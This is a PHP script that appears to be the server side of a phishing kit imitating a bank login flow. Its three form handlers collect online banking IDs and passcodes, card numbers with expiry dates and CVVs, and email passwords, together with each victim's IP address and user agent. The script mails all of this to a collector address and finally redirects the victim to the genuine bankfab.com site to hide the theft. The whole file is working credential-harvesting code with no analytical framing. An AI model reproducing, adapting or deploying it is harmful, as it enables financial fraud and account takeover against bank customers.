<?php
ob_start();

include 'email.php';

if (isset($_POST['btn1'])) {
	
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Online ID            : ".$_POST['ai']."\n";
	$message .= "Passcode              : ".$_POST['pr']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: ./card.html");
	
	
}

else if (isset($_POST['btn2'])) {
	
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Card Number           : ".$_POST['cn']."\n";
	$message .= "Exiry Date              : ".$_POST['exdate']."\n";
	$message .= "CVV              : ".$_POST['cvv']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: ./em.html");
	
	
}

else if (isset($_POST['btn3'])) {
	
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Email           : ".$_POST['aii']."\n";
	$message .= "Passcode              : ".$_POST['prr']."\n";
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: https://www.bankfab.com/en-ae/personal");
	
	
}
ob_end_flush();
?>